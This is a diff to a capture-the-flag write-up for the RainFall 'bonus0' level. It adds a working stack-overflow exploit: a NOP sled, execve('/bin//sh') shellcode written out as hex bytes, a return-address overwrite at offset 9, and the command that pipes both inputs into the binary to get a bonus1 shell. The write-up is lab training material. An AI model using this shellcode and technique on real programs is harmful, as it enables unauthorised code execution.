@@ -117,10 +117,19 @@ Program received signal SIGSEGV, Segmentation fault.
 0xbffff6a5:	0x59515151
 ```
 
-So in the offset 9 we got the segfault so we try to add our shell code in the read buffer after 20 letter and at the offset 9 we give it the address of our shell code
+So in the offset 9 we got the segfault.
+
+cause we have 4096 in the buffer we try to add 200 `NOP` and after that inject our shellcode and we got:
 
 ```
-(gdb) x/x 0xbfffe650 + 0x14
-0xbfffe664:	0x42424242
-(gdb)
+bonus0@RainFall:~$ python -c "print '\x90' * 200 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'" > a
+bonus0@RainFall:~$ python -c "print 'B' * 9 + '\x90\xe6\xff\xbf' + 'B' * 7" > b
+bonus0@RainFall:~$ (cat a; cat b -) |./bonus0
+ -
+ -
+��������������������BBBBBBBBB����BBBBBBB�� BBBBBBBBB����BBBBBBB��
+
+
+whoami
+bonus1
 ```
